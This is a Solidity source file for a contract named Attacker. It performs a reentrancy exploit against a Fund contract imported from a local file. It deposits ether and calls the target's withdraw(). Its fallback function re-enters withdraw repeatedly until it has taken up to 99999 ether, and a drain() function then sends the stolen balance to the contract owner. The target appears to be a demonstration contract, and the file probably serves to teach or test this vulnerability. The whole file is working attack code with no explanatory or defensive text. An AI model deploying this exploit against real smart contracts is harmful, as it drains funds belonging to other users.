// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "./Fund.sol";

contract Attacker {
    address public targetAddress;
    event EthReceived(address sender);
    address payable owner;
    
    constructor() {
        owner = payable(msg.sender);
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    function AddFund() external payable onlyOwner() {
        emit EthReceived(msg.sender);
    }
    
    function depositoToFund(address _address) external onlyOwner() {
        // deposit as usual so we can withdraw later
        _address.call{value: 10 ether}(
            abi.encodeWithSignature("deposit()")
        );
    }
    
    function withdrawNow(address _address) public {
        targetAddress = _address;
        Fund(_address).withdraw();
    }
    
    fallback() external payable { 
        if (address(this).balance < 99999 ether) {
            withdrawNow(targetAddress);
        }
    }
    
    function getBalance() external view onlyOwner() returns (uint256) {
        return address(this).balance;
    }
    
    function drain() external onlyOwner() {
        owner.transfer(address(this).balance);
    }
}